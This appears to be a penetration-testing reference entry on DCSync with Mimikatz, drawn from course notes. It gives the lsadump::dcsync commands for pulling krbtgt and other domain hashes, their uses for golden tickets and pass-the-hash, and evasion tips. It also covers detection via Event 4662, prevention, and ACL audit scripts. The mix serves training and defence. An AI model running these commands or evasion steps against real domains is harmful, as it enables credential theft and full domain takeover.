name: Mimikatz - DCSync (Windows)
description: Performs DCSync from a Windows host using Mimikatz's lsadump::dcsync module. Impersonates a DC replication partner to pull the target account's NT hash, Kerberos keys, and password history. Requires domain admin or equivalent DCSync rights. Use /all for full domain dump or /user for targeted account pull.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== MIMIKATZ DCSYNC vs SECRETSDUMP.PY ===
  secretsdump.py  → Linux, remote, requires creds or hash as input
  lsadump::dcsync → Windows, runs locally on a machine with AD connectivity,
                    uses the CURRENT user's token (must already be DA or have DCSync rights)

When to use Mimikatz:
  - You have a Mimikatz-ready Windows shell (DA/high-priv)
  - You prefer to work from Windows rather than Linux tools
  - You need /user targeted pull of a specific account

=== REQUIRED: PRIVILEGE::DEBUG OR ELEVATED ===
Mimikatz typically needs 'privilege::debug' first if running as a user:
  privilege::debug
  lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt

If running already as SYSTEM or NT AUTHORITY\SYSTEM, privilege::debug may not
be needed, but doesn't hurt.

=== FLAGS EXPLAINED ===
  /domain:   → target domain FQDN
  /user:     → target account to pull (domain\user format)
  /all       → pull ALL accounts (equivalent to full secretsdump)
  /dc:       → target DC hostname or IP
  /csv       → output in CSV format

=== OUTPUT TO LOOK FOR ===
  Object  : krbtgt
  Hash NTLM: <32-char hash>
  Hash NTLM history: ... (previous passwords)
  Supplemental Credentials: (AES128, AES256 keys)

=== WHAT TO EXTRACT ===
  KRBTGT hash + AES keys → golden ticket creation
  DA account hashes      → PtH for admin access
  Service account hashes → kerberoast comparison / direct use

=== CHAIN POSITION ===
After: gaining DA or DCSync-equivalent rights
After (alternative): runas /netonly to inject credentials (ad-runas-netonly)
Before: golden ticket creation (ad-golden-ticket-mimikatz), lateral movement Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).

defense.why_it_works: DCSync abuses the MS-DRSR (Directory Replication Service Remote Protocol) that DCs use to replicate with each other. Mimikatz's lsadump::dcsync issues a GetNCChanges (DRSGetNCChanges) RPC call impersonating a replication partner. The DC responds with the requested object's attributes including NT hashes, AES Kerberos keys, and password history — no code runs on the DC and LSASS is never touched on it. The calling account simply needs Replicating Directory Changes + Replicating Directory Changes All on the domain NC object.
defense.prerequisites: Domain Admin rights or explicit DCSync rights (Replicating Directory Changes + Replicating Directory Changes All granted on the domain NC object, e.g. via WriteDACL ACL abuse). An established high-privilege Windows session with network connectivity to the DC on RPC ports (135 + ephemeral). Mimikatz requires SeDebugPrivilege (privilege::debug) unless already running as SYSTEM.
defense.impact: Extracts NT hashes, AES-128/256 Kerberos keys, and password history for any domain account including KRBTGT — without touching LSASS on the DC. KRBTGT hash enables golden ticket creation (10-year persistence); DA/EA hashes enable immediate pass-the-hash; service account hashes enable offline cracking. Effectively full domain compromise from a single operation.
defense.detection: Windows Security Event 4662 on the domain object with Access Mask 0x100 and object properties matching the replication GUIDs {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes), {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes All), and {89e95b76-444d-4c62-991a-0facbeda640c} (Replicating Directory Changes In Filtered Set) from an account that is NOT a Domain Controller machine account. Microsoft Defender for Identity (MDI) generates a dedicated DCSync alert on any non-DC performing replication. Many SIEMs have canned rules for this event pattern.
defense.artifacts: Event 4662 on the DC(s) with replication GUIDs in the Properties field; MSRPC/DRSUAPI network traffic (DRSGetNCChanges) from the attacking host on ephemeral RPC ports; netlogon.log may show non-DC replication partner registration attempt; Mimikatz process on the attacker's Windows host.
defense.prevention: Audit who holds Replicating Directory Changes All on the domain NC (should be only DC machine accounts, Domain Admins, and Enterprise Admins — remove any service accounts or users that don't need it). Deploy Microsoft Defender for Identity (MDI) for real-time DCSync alerting. Implement a tiered admin model to limit Domain Admin proliferation. Protected Users group for krbtgt (prevents some credential caching). Credential Guard to protect KRBTGT material on DCs.
defense.evasion: Use /user: with a single specific account rather than /all to reduce RPC traffic volume. Time the pull during business hours to blend with normal DC replication traffic. Operate from a domain-joined Windows host to make the source less anomalous than a Linux host. Note: Event 4662 fires regardless — there is no stealth path for DCSync; fast execution and immediate lateral movement limit the response window.
defense.misconfiguration: User or computer accounts have been granted AD replication rights (DS-Replication-Get-Changes-All) that should belong exclusively to Domain Controllers. This right allows calling the MS-DRSR (Directory Replication Service Remote Protocol) to retrieve NTLM password hashes for any account — including krbtgt. Typically granted accidentally via WriteDACL on the domain object or through inherited ACEs.
defense.vulnerable_config:
# Who has DCSync rights:
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match 'DS-Replication-Get-Changes'} |
    Select-Object IdentityReference, ActiveDirectoryRights

# Dangerous: any non-DC account appearing here
# CORP\svc_monitoring  DS-Replication-Get-Changes-All  <- not a DC
defense.secure_config:
# Remove non-DC replication rights:
# Using PowerView:
Remove-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
    -PrincipalIdentity 'svc_monitoring' -Rights DCSync

# Monitor with Event 4662 (Object access with properties):
# Filter for: ObjectType = DS-Replication-Get-Changes-All GUID
# {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
# Any 4662 from non-DC account with this GUID = DCSync in progress

# Microsoft Defender for Identity: built-in 'DCSync attack' alert
# Anomalous AD replication from non-DC IPs also caught by MDI
